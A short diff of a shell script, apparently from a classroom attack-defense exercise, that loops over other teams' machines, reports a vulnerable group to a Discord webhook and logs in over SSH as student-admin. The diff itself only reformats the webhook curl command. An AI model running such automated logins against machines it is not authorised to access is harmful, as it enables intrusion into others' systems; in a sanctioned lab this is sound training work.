@@ -20,11 +20,8 @@ for i in $(seq 1 $num_files); do
     echo "group ${i} is vulnerable!"
     
     #send message to discord
-    #code was edited by ChatGPT, added a \ after Post, promt was "will this work?"
-    curl -H "Content-Type: application/json" \
-    -X POST \
-    -d '{"content":"successfully accessed another teams machine"}' \
-    ${WEBHOOK_URL}
+    #code was edited by ChatGPT, added a content field to the JSON, promt was "will this work?"
+    curl -H "Content-Type: application/json" -X POST -d '{"content":"successfully accessed another teams machine"}' ${WEBHOOK_URL}
     
     #log onto vulnerable machine
     ssh -i ${KEY} -p $((${i} + ${PORT})) student-admin@${MACHINE}
